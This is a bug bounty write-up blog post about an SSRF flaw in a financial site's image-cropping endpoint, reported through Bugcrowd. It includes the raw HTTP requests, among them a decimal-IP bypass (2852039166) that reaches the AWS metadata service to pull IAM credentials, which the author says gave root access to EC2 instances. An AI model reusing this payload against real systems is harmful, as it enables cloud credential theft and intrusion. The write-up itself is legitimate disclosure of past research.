---
title: Compromising a NASDAQ Financial Giant
published: 2026-01-17
description: 'First bug bounty post! How a cropping photo can lead to AWS takeover.'
image: './image.png'
thumbnail: './image-1.png'
tags: [SSRF, AWS]
category: Bug Bounty
draft: false 
lang: 'en'
---
It's been a couple of years since I reported this vulnerability, but now that I've started this blog, I'll begin writing about vulnerabilities I find or have found in the past. In this case, it's a critical vulnerability reported via Bugcrowd in a private program.

This vulnerability was found on the main domain. The web application allows users to contract financial products, and like most of these types of pages, it allows users to customize their profile picture. Testing this functionality, we see that it offers the possibility of cropping the image, which translates to a request similar to the following:

```http
POST /profile/crop-image HTTP/2
Host: redacted.com
Cookie: redacted
Content-Length: 112
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate

path=//redacted.s3.amazonaws.com/images/ae467edac589.jpg&X=50&Y=50&Width=150&Height=150
```

The response to this request returns a new cropped image like this:
```json
{"croppedImageURL":"//redacted.s3.amazonaws.com/images/85d4bac6e8e9.jpg"}
```

As many of you are already thinking, it seems like a good idea to test for SSRF here, and that's exactly what I thought. I sent the following request requesting google.com.

```http
POST /profile/crop-image HTTP/2
Host: redacted.com
Cookie: redacted
Content-Length: 112
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate

path=//google.com&X=50&Y=50&Width=150&Height=150
```

As expected, the response returned an image—a broken image if we open it in the browser, of course. Great!
```json
{"croppedImageURL":"//redacted.s3.amazonaws.com/images/bc5b66a2065f.jpg"}
```

Downloading the image, we examine the content and there we find the response to the HTTP request to google.com:
```bash
wget https://redacted.s3.amazonaws.com/images/bc5b66a2065f.jpg
cat bc5b66a2065f.jpg
```

Since the images are being stored in an AWS bucket, the infrastructure was likely hosted there as well, so we tried sending a request to the metadata server `http://169.254.169.254`... no luck, there was some kind of filtering blocking these requests. After a while trying bypasses, we found that the decimal representation was not being blocked, resulting in the following:

```http
POST /profile/crop-image HTTP/2
Host: redacted.com
Cookie: redacted
Content-Length: 112
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate

path=http://2852039166/latest/meta-data/iam/security-credentials/farm&X=50&Y=50&Width=150&Height=150
```

We downloaded the cropped image and there were the credentials. We configured them and were able to list thousands of EC2 instances and execute commands on them as **root**.

This vulnerability was initially rewarded with the minimum bounty for the P1 range. However, after discussing the severity of the issue and a two-month review process, the team agreed to award the maximum P1 bounty.

Some information in this post, such as the submission title or the exact endpoints, has been changed to avoid privacy issues. I hope this post was entertaining or interesting for you.   
See you in the next one!
